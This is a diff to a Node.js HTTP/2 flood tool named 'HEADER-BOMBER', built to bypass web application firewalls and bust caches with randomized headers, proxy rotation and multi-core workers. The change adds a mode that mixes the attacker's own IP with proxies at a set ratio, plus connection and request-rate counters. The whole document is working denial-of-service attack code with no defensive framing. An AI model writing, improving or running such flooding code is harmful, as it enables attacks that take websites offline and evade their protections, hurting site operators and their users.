@@ -1,6 +1,7 @@
 // R10-5: HEADER-BOMBER - Randomized Headers Flood
 // Focus: WAF bypass + Cache busting
 // Technique: Unique headers per request
+// Updated: Mixed main IP + proxies
 
 const http2 = require('http2');
 const tls = require('tls');
@@ -21,8 +22,12 @@ try {
         .filter(line => line && !line.startsWith('#') && line.includes(':'));
     console.log(`[R10-5] Loaded ${proxies.length} proxies`);
 } catch (e) {
-    console.log('[R10-5] No proxy.txt found, running without proxies');
+    console.log('[R10-5] No proxy.txt found, running with main IP only');
 }
+
+// Mix settings
+const USE_MAIN_IP = true;
+const MIX_RATIO = 0.3; // 30% main IP
 
 try {
     userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
@@ -43,8 +48,13 @@ const referers = [
     'https://amazon.com', 'https://netflix.com', 'https://reddit.com'
 ];
 
+function shouldUseMainIp() {
+    return USE_MAIN_IP && Math.random() < MIX_RATIO;
+}
+
 if (cluster.isMaster) {
     console.log(`[R10-5] HEADER-BOMBER launching on ${CPU_CORES} cores`);
+    console.log(`[R10-5] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
     for (let i = 0; i < CPU_CORES; i++) cluster.fork();
     
     setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
@@ -55,14 +65,17 @@ if (cluster.isMaster) {
     
     const sessions = [];
     let requestCount = 0;
+    let mainIpCount = 0;
+    let proxyCount = 0;
     
-    // Create sessions with proxies
+    // Create sessions with mixed IPs
     (async () => {
         for (let i = 0; i < 50; i++) {
             try {
+                const useMain = shouldUseMainIp();
                 let tlsConn;
                 
-                if (proxies.length > 0) {
+                if (!useMain && proxies.length > 0) {
                     const proxy = proxies[i % proxies.length];
                     const [proxyHost, proxyPort] = proxy.split(':');
                     
@@ -81,6 +94,7 @@ if (cluster.isMaster) {
                                 });
                                 session.on('error', () => {});
                                 sessions.push(session);
+                                proxyCount++;
                             });
                         });
                     });
@@ -90,11 +104,13 @@ if (cluster.isMaster) {
                     });
                     session.on('error', () => {});
                     sessions.push(session);
+                    mainIpCount++;
                 }
             } catch (e) {}
             
             await new Promise(r => setTimeout(r, 100));
         }
+        console.log(`[R10-5] Connections: Main IP: ${mainIpCount}, Proxy: ${proxyCount}`);
     })();
     
     function generateRandomHeaders() {
@@ -142,7 +158,7 @@ if (cluster.isMaster) {
         }, 50);
         
         setInterval(() => {
-            console.log(`[R10-5] RPS: ${requestCount}`);
+            console.log(`[R10-5] RPS: ${requestCount} | Main IP: ${mainIpCount} | Proxy: ${proxyCount}`);
             requestCount = 0;
         }, 1000);
         
